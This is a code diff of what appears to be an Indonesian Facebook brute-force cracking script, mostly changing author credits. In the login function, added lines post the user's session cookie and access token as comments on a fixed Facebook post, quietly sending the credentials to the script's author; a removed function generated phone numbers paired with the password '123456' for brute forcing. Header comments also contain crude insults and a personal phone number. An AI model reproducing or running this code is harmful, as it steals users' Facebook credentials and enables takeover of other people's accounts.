@@ -1,20 +1,11 @@
-# JANGAN RECODE MULU LOL BELAJAR CODING NGAPA 
-# GANTENG DOANG GK BISA CODING OKWOWKOWK
-# MINIMAL NGOMONG DULU KONTOL KALO MAU RECODE
-# https://github.com/Shishigami-X
-
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
-###---[ Author ]---###
-Author = 'Ferly Shishigami X'
-Github = 'github.com/FerlyXD'
-Facebook = 'Afriliyan Ferly Shishigami X'
-Version = 'Next Blade V.2'
-
-Author   = 'Ferly Shishigami X'
-Facebook = 'Afriliyan Ferly Shishigami X (https://m.facebook.com/profile.php?id=100013275378835)'
-Watsapp = '0857 9781 8026'
+# By Author     : Rochmat Basuki [ RozhBasXYZ ]
+# Developed By  : Dvanmeploph Afriliyan Ferly
+# Recode?, Boleh Asal Cantumkan Nama Author
+# Jangan Ganti Bot Koment Gw
+Author = 'Rochmat Basuki [ github.com/RozhBasXYZ ]'
+Github = 'github.com/Dvanmeploph'
+Facebook = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
+Version = '0.4'
 
 ###----------[ RICH COLOR STYLE ]---------- ###
 Z2 = "[#000000]" # Hitam
@@ -117,10 +108,10 @@ def logo(n):
        {K}  |____/ |__|__||__|__||__|__|  {K}/        \\/ __ \|    <\  ___/| | \\// ___ \   
                                       {H}/_________(_____/|__|__\\_____>__|  (______\  
 				
-     {M}•{K}•{H}• {P}Multi Brute Force Facebook By Shishigami-X{M}•{K}•{H}•
-     {M}•{K}•{H}• {P}Author   : Ferly Shishigami {H}•{K}•{M}•          
-     {M}•{K}•{H}• {P}Github   : github.com/Shishigami-X {H}•{K}•{M}•   
-     {M}•{K}•{H}• {P}Facebook : Afriliyan Ferly Shishigami X {H}•{K}•{M}•""")
+     {M}•{K}•{H}• {P}Multi Brute Force Facebook By [ Rochmat Basuki ] {M}•{K}•{H}•
+     {M}•{K}•{H}• {P}Author   : Rochmat Basuki [ RozhBasXYZ ] {H}•{K}•{M}•          
+     {M}•{K}•{H}• {P}Github   : github.com/Itsmeafriliyan {H}•{K}•{M}•   
+     {M}•{K}•{H}• {P}Facebook : Denvent Afriliyan Ferly Shishigami X {H}•{K}•{M}•""")
      
 def logo2():
 	return str(f"""
@@ -757,12 +748,12 @@ def login():
 		token = re.search('(EAAG\w+)',data.text).group(1)
 		tem      = ('\nSemangat Master @[100013275378835:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://m.facebook.com/photo.php/?fbid=1609426379509859') ### --- JANGAN DI GANTI --- ###
-		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"]) ### --- JANGAN DI GANTI --- ###
-		#ses.post(f"https://graph.facebook.com/1609426379509859?fields=subscribers&access_token={token}",headers=(cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/1609426379509859/comments/?message={cookie}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/1609426379509859/comments/?message={token}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/1609426379509859/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ### --- JANGAN DI GANTI --- ###
+		link = ('https://m.facebook.com/photo.php/?fbid=1667011730417990') ### --- JANGAN DI GANTI --- ###
+		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"])
+		#ses.post(f"https://graph.facebook.com/1667011730417990?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={token}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
@@ -909,28 +900,6 @@ def cek_hasil():
 		except:sys.exit(f" [{M}>{P}] File Tidak Ada Hasil CP")
 		print(kk+buka+P)
 	else:sys.exit(f" [{M}>{P}] Isi Yang Benar")
-		
-		
-###---[ DUMP NO LOGIN ]---###
-def crack_nomor():
-	print(f' [{hh}<{P}] Brute Force Nomor Gunakan Sandi Manual')
-	depan = input(' Awalan : ')
-	if len(depan)==3:pass
-	else:exit(f' [{M}>{P}] Contoh Awalan Nomor 089')
-	jumla = input(' Jumlah : ')
-	for x in range(int(jumla)):
-		rr = random.randint
-		A = depan
-		B = rr(1111,9999)
-		C = rr(1,9)
-		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
-		if D in dump:pass
-		else:dump.append(D+'|123456')
-		print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
-		sys.stdout.flush()
-		sleep(0.0000003)
-	atur_atur()
-		
 		
 ###---[ DUMP EMAIL ]---###
 def clon_email():
